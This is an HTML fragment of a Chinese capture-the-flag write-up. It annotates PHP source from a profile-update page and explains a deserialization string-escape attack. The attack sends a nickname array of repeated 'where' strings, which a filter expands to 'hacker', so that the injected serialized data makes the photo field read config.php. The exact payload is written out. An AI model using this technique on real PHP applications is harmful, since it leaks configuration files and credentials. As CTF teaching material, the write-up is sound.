		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token comment">//匹配昵称，开头不是大小写字母或数字，且长度小于10则die，但是如果nickname是一个数组，则可以绕过字符串长度限制</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token keyword">or</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">1000000</span><span class="token punctuation">)</span><span class="token comment">//判断图片大小</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//把上传的文件移动到新的位置，且文件名MD5加密</span>
		<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过class.php更新数据库中的信息，并且把profile数组序列化</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreWhite.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li></ul></pre> 
<p>可以看到photo不是我们可以控制的，但是在下面它对$profile这个数组进行了序列化，那么是否可以通过构造序列化来使得photo等于config.php。<br> <img src="https://img-blog.csdnimg.cn/eb8d0411ab234b908948bdb98aa49827.png" alt="在这里插入图片描述"></p> 
<p>在profile.php中个人信息存在$profile这个数组中，按顺序来序列化的话我们是否可以通过操作nickname来替换photo呢？</p> 
<h2><a name="t8"></a><a id="classphp_126"></a>class.php</h2> 
<p>这里我们看这两部分<br> <img src="https://img-blog.csdnimg.cn/276472579d5a4cf6bf8d8b477488840b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 上面这部分就是update.php中，$profile的由来</p> 
<pre data-index="6" class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul></pre> 
<p><img src="https://img-blog.csdnimg.cn/0974402913004d32aa88f0a9ba88fe6e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 这部分就是对$profile进行了过滤，也是反序列自增字符串逃逸的地方，当匹配到where时，会提换成hacker，会多出一个字符。</p> 
<p>那么，nickname则可以传34个where，因为<code>";}s:5:"photo";s:10:"config.php";}</code>有34个字符：</p> 
<pre data-index="7" class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">nickname<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>where<span class="token operator">*</span>n<span class="token string double-quoted-string">";}s:5:"</span>photo<span class="token string double-quoted-string">";s:10:"</span>config<span class="token operator">.</span>php"<span class="token punctuation">;</span><span class="token punctuation">}</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul></pre> 
<p><strong>问题之一：</strong><br> <code>为什么where";}分号后面有}</code><br> 是因为我们传nickname是数组，且数组序列化后的值会有{}这个把他包起来，where";}后面的}是为了把前面数组值序列化后的内容闭合<br> <img src="https://img-blog.csdnimg.cn/f598f244f9db44d3b41c557fbd02308d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 到profile.php,看图片所在源码位置base64解密一下<br> <img src="https://img-blog.csdnimg.cn/d95d3123d2f34edba4ff0c7a35f8ce78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/b08b3bf2ad0044f99003466f3fa04679.png" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/db08568a613d4fe7874a30869f91f7ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
        </div>
